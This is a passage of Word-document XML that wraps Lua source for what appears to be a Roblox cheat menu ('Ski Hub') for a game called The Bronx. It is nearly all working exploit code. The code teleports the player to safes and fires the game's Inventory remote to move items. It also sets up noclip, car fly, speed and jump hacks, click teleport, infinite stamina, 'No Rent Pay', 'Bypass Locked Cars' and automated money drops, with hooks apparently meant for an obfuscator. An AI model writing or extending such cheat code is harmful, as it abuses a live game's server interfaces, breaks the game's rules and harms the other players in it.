        <w:t xml:space="preserve">                if child.Name == Tool then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Done = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    conn:Disconnect()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task.delay(1, function() Done = true end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.wait(0.1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ReplicatedStorage.Inventory:FireServer("Change", Tool, "Backpack", Safe)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            repeat task.wait(0.1) until Done</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            FastTP(OldCFrame)</w:t>
      </w:r>
    </w:p>
    <w:p/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`Successfully safed {Tool}!`,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end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>SafeItemColumn = SafeTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>SafeItemSection = SafeItemColumn:section({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    name = "Take Selected Item",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    side = "right",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    size = 1,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    icon = GetImage("UZI.png")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local _TakeItem = SafeItemSection:list({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    flag = "TakeSelectedItem_TheBronx",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    options = {},</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not state then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Safe = GetWorkingSafe()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not Safe then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local HRP = LocalPlayer.Character.HumanoidRootPart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local OldCFrame = HRP.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">           FastTP(Safe.ChestClicker.CFrame)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.wait(0.05)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Tool = tostring(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Done = false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local conn</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            conn = LocalPlayer.Backpack.ChildAdded:Connect(function(child)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if child.Name == Tool then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Done = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    conn:Disconnect()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task.delay(1, function() Done = true end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.wait(0.1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ReplicatedStorage.Inventory:FireServer("Change", Tool, "Inv", Safe)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            repeat task.wait(0.1) until Done</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            FastTP(OldCFrame)</w:t>
      </w:r>
    </w:p>
    <w:p/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`Successfully took {Tool} from safe!`,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end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local Backpack_ChildAdded, Backpack_ChildRemoved</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local ConnectBackpackToRefreshSafeList = LPH_JIT_MAX(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LocalPlayer:WaitForChild("Backpack")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local Refresh = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Items = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if tool:IsA("Tool") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                table.insert(Items, tool.Name)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table.sort(Items)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        _SafeItem.refresh_options(Items)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return Items</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    task.spawn(Refresh)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if Backpack_ChildAdded then Backpack_ChildAdded:Disconnect() end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if Backpack_ChildRemoved then Backpack_ChildRemoved:Disconnect() end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Backpack_ChildAdded = LocalPlayer.Backpack.ChildAdded:Connect(Refresh)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Backpack_ChildRemoved = LocalPlayer.Backpack.ChildRemoved:Connect(Refresh)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Players.PlayerRemoving:Connect(LPH_NO_VIRTUALIZE(function(player)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if player == LocalPlayer then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if Backpack_ChildAdded then Backpack_ChildAdded:Disconnect() end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if Backpack_ChildRemoved then Backpack_ChildRemoved:Disconnect() end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>task.spawn(ConnectBackpackToRefreshSafeList)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>LocalPlayer.CharacterAdded:Connect(ConnectBackpackToRefreshSafeList)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local RefreshTakeItemList = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local Items = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for _, value in ipairs(LocalPlayer:WaitForChild("InvData"):GetChildren()) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        table.insert(Items, value.Name)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    table.sort(Items)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _TakeItem.refresh_options(Items)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    return Items</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>task.spawn(RefreshTakeItemList)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>LocalPlayer:WaitForChild("InvData").ChildAdded:Connect(RefreshTakeItemList)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>LocalPlayer:WaitForChild("InvData").ChildRemoved:Connect(RefreshTakeItemList)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>--experiment end]]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            do -- \\ Local Player Tab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local LocalPlayerColumn = LocalPlayerTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local LocalPlayerModsSection = LocalPlayerColumn:section({name = "Player Mods", side = "left", size = 1.05})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local __Modifications = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Infinite Sleep";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Infinite Hunger";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Infinite Stamina";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Instant Interact";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Fast Respawn";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Auto Pickup Cash";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Auto Pickup Bags";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Disable Camera Bobbing";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Disable Blood Effects";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Bypass Locked Cars";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "No Rent Pay";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Anti Lose Items";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Ski Hub Name Tag";                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "No Jump Cooldown";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "No Fall Damage";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "No Knockback";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Respawn Where You Died";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, Index in __Modifications do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayerModsSection:toggle({type = "toggle", name = Index, flag = Index, default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Config.TheBronx.PlayerModifications[Index:gsub(" ", "")] = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayerColumn = LocalPlayerTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local CharacterModsSection = LocalPlayerColumn:section({name = "Extra Player Mods", side = "right", size = 0.820, icon = GetImage("Wrench.png")}) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --[[CharacterModsSection:toggle({type = "toggle", name = "Fly", flag = "invisfly", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.invisfly = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})]]                 </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                CharacterModsSection:toggle({type = "toggle", name = "Car Fly", flag = "carfly", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.carfly = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end}) </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                CharacterModsSection:toggle({type = "toggle", name = "Modify WalkSpeed", flag = "ModifyWalkSpeed_TheBronx", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.MiscSettings.ModifySpeed.Enabled = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})                   </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                CharacterModsSection:toggle({type = "toggle", name = "Modify JumpPower", flag = "ModifyJumpPower_TheBronx", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.MiscSettings.ModifyJump.Enabled = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                CharacterModsSection:toggle({type = "toggle", name = "Click Teleport", flag = "ClickTeleport_TheBronx", default = false})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local _NoClipToggle = CharacterModsSection:toggle({type = "toggle", name = "No Clip", flag = "NoClip_TheBronx", seperator = true, default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if state then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        RunService:BindToRenderStep("NOCLIP", 1, LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if LocalPlayer.Character.Humanoid.Health ~= 0 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    for Index, Value in LocalPlayer.Character:GetDescendants() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        if Collide_Data[Value.Name] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                Value.CanCollide = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    for Index, Value in LocalPlayer.Character:GetDescendants() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        if Collide_Data[Value.Name] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                Value.CanCollide = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        end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end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        RunService:UnbindFromRenderStep("NOCLIP")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        for Index, Value in LocalPlayer.Character:GetDescendants() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Collide_Data[Value.Name] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Value.CanCollide = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end)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end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                CharacterModsSection:slider({name = "Car Fly Speed", flag = "carflyspeed", min = 50, max = 300, default = 50, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.carflyspeed = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})                </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                CharacterModsSection:slider({name = "WalkSpeed Value", flag = "WalkSpeedValue_TheBronx", min = 0, max = 250, default = 50, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.MiscSettings.ModifySpeed.Value = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --[[CharacterModsSection:slider({name = "Fly Speed", flag = "invisflyspeed", min = 5, max = 50, default = 10, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.invisflyspeed = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})]]                 </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                CharacterModsSection:slider({name = "JumpPower Value", flag = "JumpPowerValue_TheBronx", min = 0, max = 250, default = 7, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.MiscSettings.ModifyJump.Value = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                CharacterModsSection:keybind({name = "Click Teleport Key", flag = "ClickTeleportKey_TheBronx", key = Enum.KeyCode.LeftControl, mode = "Hold", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.ClickTeleportActive = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local ExtraTabColumn = ExtraTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local BankSection = ExtraTabColumn:section({name = "Bank Section", side = "right", size = 0.550, icon = GetImage("Settings.png")})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BankSection:toggle({type = "toggle", name = "Auto Drop", flag = "AutoDrop", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.AutoDrop = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                 BankSection:toggle({type = "toggle", name = "Auto Deposit", flag = "depos", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.depos = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                 BankSection:toggle({type = "toggle", name = "Auto Withdraw", flag = "draww", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.draww = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})                  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BankSection:slider({name = "Auto Drop Amount", flag = "MoneyAmount", min = 100, max = 10000, default = 10000, suffix = "$", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.MoneyAmount = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BankSection:slider({name = "Auto Deposit Amount", flag = "DepositAmount", min = 1, max = 30000, default = 30000, suffix = "$", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.DepositAmount = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BankSection:slider({name = "Auto Withdraw Amount", flag = "WithdrawAmount", min = 1, max = 90000, default = 90000, suffix = "$", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.WithdrawAmount = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Skysection = ExtraTabColumn:section({name = "Custom Skyboxes", side = "right", size = 0.450, icon = GetImage("Settings.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local function setSky(skyIds)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local L = game:GetService("Lighting")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    L.ClockTime = 9</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local old = L:FindFirstChildOfClass("Sky")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if old then old:Destroy() end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local S = Instance.new("Sky")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    S.SkyboxBk = skyIds.Bk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    S.SkyboxDn = skyIds.Dn</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    S.SkyboxFt = skyIds.Ft</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    S.SkyboxLf = skyIds.Lf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    S.SkyboxRt = skyIds.Rt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    S.SkyboxUp = skyIds.Up</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    S.Parent = L</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    S:Clone().Parent = L</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>-- Realistic Day Time</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Skysection:button({name = "Day Time", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    setSky({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Bk = "rbxassetid://74258544564321",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Dn = "rbxassetid://75418092548143",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Ft = "rbxassetid://114547356324218",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Lf = "rbxassetid://91138773974890",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
